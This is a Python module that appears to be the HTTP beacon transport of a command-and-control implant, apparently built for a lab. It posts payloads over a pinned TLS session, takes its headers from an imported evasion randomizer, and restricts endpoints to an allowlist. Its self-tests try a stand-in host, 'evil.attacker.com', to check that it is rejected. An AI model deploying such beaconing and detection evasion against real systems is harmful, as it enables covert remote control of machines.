import urllib.parse
import requests
import os

from common import config
from common.logger import get_logger
from common.utils import TransportError
from evasion.header_randomizer import get_headers
from transport.traffic_profile import load_active_profile

logger = get_logger('transport')

REQUEST_TIMEOUT_S = 10  # hard timeout for all outbound requests
MAX_RESPONSE_BYTES = 65536  # prevent oversized server responses

# Session factory
def _build_session() -> requests.Session:
    # Create a requests.Session with TLS cert pinned to config.TLS_CERT_PATH.
    cert_path = os.path.abspath(config.TLS_CERT_PATH)
    if not os.path.exists(cert_path):
        raise TransportError(
            f'TLS cert not found at {cert_path} — '
            f'copy certs/server.crt from the Ubuntu VM'
        )
    session = requests.Session()
    session.verify = cert_path
    return session

# Host validation
def _validate_host(endpoint: str) -> None:
    # Raise TransportError if the endpoint host is not in ALLOWED_HOSTS.
    try:
        host = urllib.parse.urlparse(endpoint).hostname
    except Exception as e:
        raise TransportError(f'invalid endpoint URL: {e}')

    if not host:
        raise TransportError('invalid endpoint URL: hostname missing')

    if host not in config.ALLOWED_HOSTS:
        raise TransportError(
            f'host "{host}" is not in ALLOWED_HOSTS {config.ALLOWED_HOSTS}'
        )


# Public API
def send_beacon(endpoint: str, payload: bytes) -> bytes:
    # Validate host, POST encrypted payload, return raw response bytes.
    _validate_host(endpoint)

    logger.info('sending beacon', extra={
        'endpoint':     endpoint,
        'payload_size': len(payload),
    })

    session = _build_session()

    try:
        profile  = load_active_profile()
        headers  = get_headers(profile.header_level)

        response = session.post(
            endpoint,
            data    = payload,
            headers = headers,
            timeout = REQUEST_TIMEOUT_S,
        )
    except requests.exceptions.ConnectionError as e:
        logger.warning('connection error', extra={'endpoint': endpoint, 'reason': str(e)})
        raise TransportError(f'connection error: {e}')

    except requests.exceptions.Timeout:
        logger.warning('request timed out', extra={'endpoint': endpoint})
        raise TransportError(f'request timed out after {REQUEST_TIMEOUT_S}s')

    except requests.exceptions.RequestException as e:
        logger.warning('request failed', extra={'endpoint': endpoint, 'reason': str(e)})
        raise TransportError(f'request failed: {e}')

    finally:
        session.close()
        
    if response.status_code >= 400:
        logger.warning('server returned error status', extra={
            'endpoint':    endpoint,
            'status_code': response.status_code,
        })
        raise TransportError(f'HTTP {response.status_code}', status_code=response.status_code)

    logger.info('beacon response received', extra={
        'endpoint':       endpoint,
        'status_code':    response.status_code,
        'response_size':  len(response.content),
    })

    return response.content[:MAX_RESPONSE_BYTES]


# Self-test
if __name__ == '__main__':
    from common.utils import TransportError

    print("Running http_transport self-test...")

    # Test 1 — host not in ALLOWED_HOSTS raises TransportError before connecting
    try:
        send_beacon('https://evil.attacker.com/beacon', b'data')
        print("  FAIL: should have raised TransportError for disallowed host")
    except TransportError as e:
        assert 'ALLOWED_HOSTS' in str(e), \
            "FAIL: error message should mention ALLOWED_HOSTS"
        print("  [OK] disallowed host raises TransportError before connecting")

    # Test 2 — invalid URL raises TransportError
    try:
        send_beacon('not-a-url', b'data')
        print("  FAIL: should have raised TransportError for invalid URL")
    except TransportError:
        print("  [OK] invalid URL raises TransportError")

    # Test 3 — allowed host that refuses connection raises TransportError
    # Uses a valid allowed host but a port nothing is listening on
    original_port = config.BACKEND_PORT
    try:
        send_beacon(f'https://192.168.100.10:19999/beacon', b'data')
        print("  FAIL: unreachable host should raise TransportError")
    except TransportError as e:
        print(f"  [OK] unreachable host raises TransportError: {e}")

    # Test 4 — _validate_host passes for all ALLOWED_HOSTS entries
    for host in config.ALLOWED_HOSTS:
        try:
            _validate_host(f'https://{host}/beacon')
            print(f"  [OK] _validate_host passes for allowed host: {host}")
        except TransportError as e:
            print(f"  FAIL: _validate_host rejected allowed host {host}: {e}")

    # Test 5 — _validate_host rejects hosts not in ALLOWED_HOSTS
    blocked_hosts = ['google.com', '10.0.0.1', 'attacker.internal']
    for host in blocked_hosts:
        try:
            _validate_host(f'https://{host}/beacon')
            print(f"  FAIL: _validate_host should reject {host}")
        except TransportError:
            print(f"  [OK] _validate_host rejects disallowed host: {host}")

    print("\nAll http_transport self-tests passed.")